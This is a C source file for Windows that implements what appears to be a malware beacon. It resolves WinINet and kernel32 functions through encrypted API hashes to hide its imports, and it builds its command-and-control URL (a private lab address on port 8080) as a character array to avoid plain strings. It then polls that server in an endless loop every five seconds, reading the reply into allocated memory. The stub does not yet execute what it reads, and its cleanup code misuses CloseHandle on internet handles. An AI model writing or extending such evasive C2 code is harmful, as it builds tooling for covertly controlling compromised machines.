#include "windows.h"
#include "wininet.h"

#include "ApiResolve.h"

#define FAIL 0
#define SUCCESS 1

//#define C2 "http://192.168.56.1:8080"
//#define UA "Firefox ... "

#define MAX_BUFFER 0x4096
#define INTERVAL 5 * 1000

DWORD 
go(void) {

  INTERNETOPENA _InternetOpenA = (INTERNETOPENA)getFunctionPtr(CRYPTED_HASH_WININET, CRYPTED_HASH_INTERNETOPENA);
  VIRTUALALLOC _VirtualAlloc = (VIRTUALALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALALLOC);
  INTERNETOPENURLA _InternetOpenUrlA = (INTERNETOPENURLA)getFunctionPtr(CRYPTED_HASH_WININET, CRYPTED_HASH_INTERNETOPENURLA);
  INTERNETREADFILE _InternetReadFile = (INTERNETREADFILE)getFunctionPtr(CRYPTED_HASH_WININET, CRYPTED_HASH_INTERNETREADFILE);
  SLEEP _Sleep = (SLEEP)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_SLEEP);
  CLOSEHANDLE _CloseHandle = (CLOSEHANDLE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_CLOSEHANDLE);

  if ( _InternetOpenA == 0x00 || _VirtualAlloc == 0x00 )
    return 0;

  DWORD dw_success = 0x00, dw_read = 0x00;
  LPVOID ptr_buffer;
  HINTERNET h_internet, h_url;

  char C2[] = { 'h', 't','t','p', ':', '/', '/',  '1', '9', '2', '.', '1', '6', '8', '.','5', '6', '.', '1',':','8', '0', '8', '0', 0x00 };
  char UA[] = {'b', 'l', 'a', 0x00};

  h_internet = _InternetOpenA(UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (h_internet == NULL)
    goto exit;

  ptr_buffer = _VirtualAlloc(0, MAX_BUFFER, MEM_COMMIT, PAGE_READWRITE);
  if(ptr_buffer == NULL)
    goto exit;

  while ( 1 ) {

    h_url = _InternetOpenUrlA(h_internet, C2, NULL, 0, 0, 0);
    if (h_url == NULL)
      goto exit;

    _InternetReadFile(h_url, ptr_buffer, MAX_BUFFER, &dw_read);

    _Sleep(5000);

  }


exit_success:
  dw_success = SUCCESS;
exit:

  if(h_internet)
    _CloseHandle(h_internet);

  if(h_url)
    _CloseHandle(h_url);

  return dw_success;

}
